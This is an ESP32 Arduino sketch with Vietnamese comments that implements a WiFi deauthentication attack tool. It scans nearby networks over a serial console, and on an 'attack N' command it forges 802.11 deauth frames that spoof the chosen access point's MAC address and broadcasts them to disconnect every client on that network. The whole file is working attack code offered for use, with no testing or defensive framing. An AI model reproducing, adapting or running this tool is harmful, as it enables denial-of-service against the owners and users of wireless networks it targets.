#include <WiFi.h>
#include <esp_wifi.h>

// Định nghĩa gói tin deauth (theo chuẩn 802.11)
uint8_t deauthFrame[26] = {
  0xC0, 0x00, // Loại khung: Deauthentication
  0x00, 0x00, // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Địa chỉ đích (Broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Địa chỉ nguồn (AP MAC)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP MAC)
  0x00, 0x00, // Sequence number
  0x07, 0x00  // Lý do: Class 3 frame received from nonassociated station
};

// Cấu trúc lưu thông tin mạng
struct Network {
  String ssid;
  String bssid;
  uint8_t channel;
  uint8_t bssidBytes[6];
};

// Mảng lưu danh sách mạng
Network networks[20]; // Giới hạn 20 mạng để tránh tràn bộ nhớ
int networkCount = 0;

// Hàm gửi gói tin deauth (đã sửa để dùng hai tham số)
void sendDeauthFrame(uint8_t* apMac, uint8_t* stationMac, uint8_t channel) {
  memcpy(&deauthFrame[4], stationMac, 6);  // MAC đích
  memcpy(&deauthFrame[10], apMac, 6);      // MAC nguồn
  memcpy(&deauthFrame[16], apMac, 6);      // BSSID

  // Đặt kênh WiFi với tham số thứ hai là WIFI_SECOND_CHAN_NONE
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  // Gửi 10 gói tin deauth
  for (int i = 0; i < 10; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
    delay(10);
  }
  Serial.println("Đã gửi gói Deauth");
}

// Hàm chuyển chuỗi BSSID thành mảng byte
void parseMacAddress(String macStr, uint8_t* macArray) {
  for (int i = 0; i < 6; i++) {
    String byteStr = macStr.substring(i * 3, i * 3 + 2);
    macArray[i] = (uint8_t)strtol(byteStr.c_str(), NULL, 16);
  }
}

// Hàm quét mạng WiFi và lưu vào mảng
void scanNetworks() {
  Serial.println("Đang quét mạng WiFi...");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  networkCount = WiFi.scanNetworks();
  if (networkCount == 0) {
    Serial.println("Không tìm thấy mạng nào!");
    return;
  }

  // Giới hạn số mạng để tránh tràn
  if (networkCount > 20) networkCount = 20;

  Serial.println("Danh sách mạng WiFi:");
  for (int i = 0; i < networkCount; i++) {
    networks[i].ssid = WiFi.SSID(i);
    networks[i].bssid = WiFi.BSSIDstr(i);
    networks[i].channel = WiFi.channel(i);
    parseMacAddress(networks[i].bssid, networks[i].bssidBytes);

    Serial.print(i + 1);
    Serial.print(": ");
    Serial.print(networks[i].ssid);
    Serial.print(" (BSSID: ");
    Serial.print(networks[i].bssid);
    Serial.print(", Kênh: ");
    Serial.print(networks[i].channel);
    Serial.println(")");
  }
  Serial.println("Nhập 'attack <số thứ tự>' để tấn công mạng. Ví dụ: attack 1");
}

void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("ESP32 WiFi Deauther - Giao diện Serial");
  Serial.println("Lệnh: scan | attack <số thứ tự>");
  Serial.println("Ví dụ: scan | attack 1");

  // Khởi tạo WiFi
  WiFi.mode(WIFI_AP_STA);
  esp_wifi_init(NULL);
  esp_wifi_set_promiscuous(true); // Bật chế độ bắt gói tin
}

void loop() {
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    command.trim();

    if (command == "scan") {
      scanNetworks();
    } else if (command.startsWith("attack")) {
      // Phân tích lệnh: attack <số thứ tự>
      String args = command.substring(7); // Bỏ "attack "
      int index = args.toInt() - 1; // Chuyển số thứ tự thành chỉ số mảng

      if (index < 0 || index >= networkCount) {
        Serial.println("Số thứ tự không hợp lệ! Chọn số từ 1 đến " + String(networkCount));
        return;
      }

      // MAC broadcast (tấn công tất cả thiết bị)
      uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

      Serial.print("Tấn công Deauth vào: ");
      Serial.print(networks[index].ssid);
      Serial.print(" (BSSID: ");
      Serial.print(networks[index].bssid);
      Serial.print(", Kênh: ");
      Serial.print(networks[index].channel);
      Serial.println(")");
      
      sendDeauthFrame(networks[index].bssidBytes, broadcastMac, networks[index].channel);
    } else {
      Serial.println("Lệnh không xác định! Dùng: scan | attack <số thứ tự>");
    }
  }
}